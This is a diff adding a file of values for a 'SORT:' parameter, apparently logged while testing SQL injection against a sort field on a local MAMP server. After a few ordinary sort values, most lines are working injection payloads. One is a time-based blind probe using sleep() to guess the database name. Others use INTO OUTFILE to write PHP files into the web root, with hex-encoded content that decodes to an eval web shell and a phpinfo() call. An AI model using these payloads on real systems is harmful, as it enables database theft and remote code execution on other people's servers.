@@ -1,0 +1,29 @@
+SORT:1
+SORT:2
+SORT:3
+SORT:id desc
+SORT:id desc
+SORT:id asc
+SORT:1 desc
+SORT:1 desc
+SORT:1 asc
+SORT:1 asc
+SORT:1 desc
+SORT:1 desc
+SORT:1 asc
+SORT:1 desc
+SORT:1 desc
+SORT:1 desc
+SORT:1 desc
+SORT:1
+SORT:1' and if(ascii(substr(database(),1,1)) = 116 , 0 , sleep(1) ) #
+SORT:1'  into outfile '/Users/hacker-mao/Documents/MAMP/2.php' #
+SORT:1'  into outfile '/Users/hacker-mao/Documents/MAMP/2.php' #
+SORT:1'  into outfile '/Users/hacker-mao/Documents/MAMP/2.php' #
+SORT:1'  into outfile '/Users/hacker-mao/Documents/MAMP/2.php' #
+SORT:1'  into outfile '/Users/hacker-mao/Documents/MAMP/2.php' #
+SORT:1'  into outfile '/Users/hacker-mao/Documents/MAMP/2.php' #
+SORT:1' into outfile '/Users/hacker-mao/Documents/MAMP/3.php' lines terminated by 0x3c3f70687020406576616c28245f706f73745b22313233225d293f3e #
+SORT:1' into outfile '/Users/hacker-mao/Documents/MAMP/3.php' lines terminated by 0x3c3f70687020406576616c28245f706f73745b22313233225d293f3e #
+SORT:1' into outfile '/Users/hacker-mao/Documents/MAMP/3.php' lines terminated by 0x3c3f70687020406576616c28245f706f73745b22313233225d293f3e #
+SORT:1' into outfile '/Users/hacker-mao/Documents/MAMP/3.php' lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020 #
